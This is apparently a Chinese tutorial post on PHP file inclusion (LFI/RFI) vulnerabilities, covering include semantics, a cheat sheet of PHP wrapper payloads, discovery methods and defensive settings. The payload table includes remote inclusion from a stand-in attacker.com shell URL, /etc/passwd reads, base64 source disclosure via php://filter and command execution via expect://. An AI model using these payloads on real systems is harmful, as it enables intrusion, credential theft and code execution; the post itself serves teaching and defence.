任意文件包含（LFI / RFI）

2026-06-28 WEB渗透 ， 基础漏洞

一、概述

1.1 什么是文件包含

开发者把可复用的函数或代码段写到单个文件里形成”封装”，调用时直接 include，不用重复编写。这种调用文件的过程就叫文件包含。 为了让代码更灵活，被包含文件的路径通常设为变量来动态调用。但如果路径变量能被客户端控制，就产生了任意文件包含漏洞。

该漏洞在 PHP Web 应用中居多，JSP / ASP / ASP.NET 中较少。

1.2 PHP 四个包含语句

语句 区别
include() 多次包含，多次执行；失败产生警告（E_WARNING），脚本继续运行
include_once() 多次包含，只执行一次；失败产生警告，继续运行
require() 多次包含，多次执行；失败产生错误（E_ERROR），脚本终止
require_once() 多次包含，只执行一次；失败产生错误，终止执行

2.4 核心特点

两个让文件包含变得特别危险的特质：

  1. 无视扩展名——图片马、日志文件、session 文件，不管后缀是什么，include 全当 PHP 执行
  2. 无条件解析 PHP 标签——只要内容里有 <?php ?>，包含时就触发

三、PHP 伪协议

伪协议是 LFI 升级为 RCE 的核心跳板——即使没有文件上传点，也能读源码、执行命令、写 Shell。

3.1 全协议速查

协议 格式 用途
file:// file:///etc/passwd 访问本地文件
http:// http://attacker.com/shell.txt 远程包含（RFI）
php://filter php://filter/read=convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=index.php		 读 PHP 源码（用得最多）
php://input php://input + POST body 直接执行 PHP 命令
data:// data://text/plain,<?php phpinfo()?> 数据流直接注入 PHP 代码
phar:// phar://upload/test.zip/shell.php 解压 phar/zip 并包含
expect:// expect://whoami 执行系统命令（需 PECL 扩展）
zip:// zip://shell.zip%23shell.php zip 包内文件包含
zlib:// zlib://shell.gz 压缩流
ftp:// ftp://user:pass@host/file FTP 访问
glob:// glob:///var/www/*.php 匹配路径模式
rar:// rar://shell.rar%23shell.php RAR 压缩包

参考：PHP 伪协议总结

3.2 三个核心伪协议

php://filter — 读源码：

最常用的场景——读配置文件、读数据库密码、读代码逻辑找下一个突破口。

php://input — 执行 PHP 命令：

POST body 里的 PHP 代码直接被 include 执行。无需文件上传，无需 RFI 开启（但需要 allow_url_include=On）。

data:// — 直接注入：

不需要 allow_url_include=On，只需要 allow_url_fopen=On。base64 版可绕过关键字过滤。

六、挖掘

黑盒： 观察参数值是否像一个文件名或路径，改了之后页面内容是否跟着变。

白盒： 搜索关键函数：include、include_once、require、require_once、file_get_contents → 回溯参数是否可控 → 检查伪协议是否可用于绕过。

七、防御

  • 尽量少用动态包含
  • 严格过滤被包含文件路径，用白名单
  • allow_url_include = Off（关掉远程包含）
  • allow_url_fopen = Off（关掉远程文件读取）
